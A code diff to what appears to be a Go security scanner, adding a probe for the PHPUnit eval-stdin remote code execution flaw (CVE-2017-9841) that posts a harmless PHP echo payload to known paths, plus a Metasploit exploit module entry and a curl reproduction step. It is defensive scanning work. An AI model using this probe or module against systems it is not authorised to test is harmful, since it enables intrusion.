@@ -38,7 +38,7 @@ import (
 
 // metasploitNativeProbeCount is the number of native Go probe functions called
 // in MetasploitAgent.Run. Update this constant whenever a probe is added or removed.
-const metasploitNativeProbeCount = 14
+const metasploitNativeProbeCount = 15
 
 // MetasploitAgent orchestrates Metasploit-based web exploit checks.
 type MetasploitAgent struct {
@@ -86,6 +86,7 @@ func (a *MetasploitAgent) Run(ctx context.Context, input AgentInput) (AgentOutpu
 	output.Findings = append(output.Findings, probeThinkPHPRCE(ctx, client, input.Target, input.AuthProfile)...)
 	output.Findings = append(output.Findings, probeExchangeProxyLogon(ctx, client, input.Target, input.AuthProfile)...)
 	output.Findings = append(output.Findings, probeWebAssemblyModuleAbuse(ctx, client, input.Target, input.AuthProfile)...)
+	output.Findings = append(output.Findings, probePHPUnitEvalStdinRCE(ctx, client, input.Target, input.AuthProfile)...)
 
 	// ── Phase 2: Metasploit RPC (optional, when msfrpcd is reachable) ─────
 	msfURL := strings.TrimSpace(os.Getenv("MSF_RPC_URL"))
@@ -797,6 +798,70 @@ func probeWebAssemblyModuleAbuse(ctx context.Context, client *http.Client, targe
 	}}
 }
 
+// probePHPUnitEvalStdinRCE probes exposed PHPUnit eval-stdin endpoint
+// (CVE-2017-9841) with a deterministic harmless echo marker.
+func probePHPUnitEvalStdinRCE(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
+	u, err := url.Parse(target)
+	if err != nil {
+		return nil
+	}
+	u.Path = ""
+	u.RawQuery = ""
+	base := strings.TrimRight(u.String(), "/")
+	endpoints := []string{
+		"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+		"/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php",
+		"/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+	}
+	marker := "abh_phpunit_probe_5f4dcc3b5aa765d61d8327deb882cf99"
+	payload := "<?php echo '" + marker + "'; ?>"
+
+	for _, ep := range endpoints {
+		probeURL := base + ep
+		req, err := http.NewRequestWithContext(ctx, http.MethodPost, probeURL, strings.NewReader(payload))
+		if err != nil {
+			continue
+		}
+		scanner.ApplyAuthProfile(req, profile)
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
+		resp.Body.Close()
+		bodyLower := strings.ToLower(string(body))
+
+		if resp.StatusCode == http.StatusOK && strings.Contains(bodyLower, strings.ToLower(marker)) {
+			return []model.Finding{{
+				ID:          "msf-phpunit-eval-stdin",
+				Category:    "remote_code_execution",
+				Severity:    model.SeverityHigh,
+				Title:       "PHPUnit eval-stdin.php RCE indicator (CVE-2017-9841)",
+				Description: "The publicly reachable PHPUnit eval-stdin endpoint executed supplied input and returned a deterministic marker. This behavior is consistent with unauthenticated remote code execution exposure.",
+				Evidence:    fmt.Sprintf("endpoint=%s status=%d marker_reflected=true", ep, resp.StatusCode),
+				Recommendation: "Remove development dependencies (vendor/phpunit) from production builds, deny public access to /vendor paths, and rotate secrets that may have been exposed.",
+				AffectedURL:     probeURL,
+				OWASPCategory:   "OWASP A06:2021 - Vulnerable and Outdated Components",
+				CWE:             "CWE-94",
+				CVSSScore:       9.8,
+				CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+				MITRETechniques: []string{"T1190", "T1059.006"},
+				ReproductionSteps: []string{
+					fmt.Sprintf("curl -s -X POST '%s' -d %q", probeURL, payload),
+					"Observe the deterministic marker in the response body",
+				},
+				References: []string{
+					"https://nvd.nist.gov/vuln/detail/CVE-2017-9841",
+					"https://www.rapid7.com/db/modules/exploit/unix/http/phpunit_eval_stdin/",
+				},
+			}}
+		}
+	}
+	return nil
+}
+
 // ── Metasploit RPC ────────────────────────────────────────────────────────────
 
 // msfRPCResponse is the minimal shape returned by msfrpcd JSON-RPC calls.
@@ -912,6 +977,12 @@ func runMSFRPCModules(ctx context.Context, client *http.Client, rpcURL, password
 			title:   "WordPress XML-RPC Pingback SSRF",
 			cve:     "",
 			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
+		},
+		{
+			name:    "exploit/unix/http/phpunit_eval_stdin",
+			title:   "PHPUnit eval-stdin.php RCE (CVE-2017-9841)",
+			cve:     "CVE-2017-9841",
+			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl, "TARGETURI": "/"},
 		},
 	}
 
